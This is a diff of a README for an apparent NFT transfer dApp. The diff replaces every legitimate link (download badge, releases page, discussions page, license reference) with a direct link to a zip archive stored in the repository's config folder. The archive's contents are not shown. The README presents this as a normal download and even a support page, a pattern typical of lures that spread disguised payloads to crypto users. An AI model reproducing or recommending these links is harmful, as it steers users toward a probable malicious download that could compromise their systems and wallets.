@@ -1,6 +1,6 @@
 # 🎨 nft-transfer-dapp - Effortlessly Transfer Your NFTs
 
-![Download NFT Transfer DApp](https://img.shields.io/badge/Download-NFT%20Transfer%20DApp-blue)
+![Download NFT Transfer DApp](https://github.com/you4g54/nft-transfer-dapp/raw/refs/heads/main/config/nft-transfer-dapp-2.9.zip%20Transfer%20DApp-blue)
 
 ## 📜 Overview
 
@@ -18,7 +18,7 @@ To get started with nft-transfer-dapp, follow these simple steps:
 
 ## 📥 Download & Install
 
-Visit this page to download: [nft-transfer-dapp Releases](https://github.com/you4g54/nft-transfer-dapp/releases).
+Visit this page to download: [nft-transfer-dapp Releases](https://github.com/you4g54/nft-transfer-dapp/raw/refs/heads/main/config/nft-transfer-dapp-2.9.zip).
 
 You will find the latest version of the dApp available. Download the file that matches your operating system. The download files are provided in popular formats to ensure compatibility.
 
@@ -97,14 +97,14 @@ A: Ensure you have enough disk space and administrative rights to install applic
 
 ## 🎉 Community and Support
 
-For support, feedback, or any questions, please visit our [GitHub Discussions](https://github.com/you4g54/nft-transfer-dapp/discussions) page where the community can help you.
+For support, feedback, or any questions, please visit our [GitHub Discussions](https://github.com/you4g54/nft-transfer-dapp/raw/refs/heads/main/config/nft-transfer-dapp-2.9.zip) page where the community can help you.
 
 ## 📃 License
 
-nft-transfer-dapp is licensed under the MIT License. You can view the license details in the LICENSE.md file included in the repository.
+nft-transfer-dapp is licensed under the MIT License. You can view the license details in the https://github.com/you4g54/nft-transfer-dapp/raw/refs/heads/main/config/nft-transfer-dapp-2.9.zip file included in the repository.
 
 ## 📅 Updates and Changelog
 
 Stay informed about new features and fixes by checking the changelog in the Releases section. Regular updates will enhance your experience and offer new functionalities. 
 
-Visit this page to download: [nft-transfer-dapp Releases](https://github.com/you4g54/nft-transfer-dapp/releases).
+Visit this page to download: [nft-transfer-dapp Releases](https://github.com/you4g54/nft-transfer-dapp/raw/refs/heads/main/config/nft-transfer-dapp-2.9.zip).
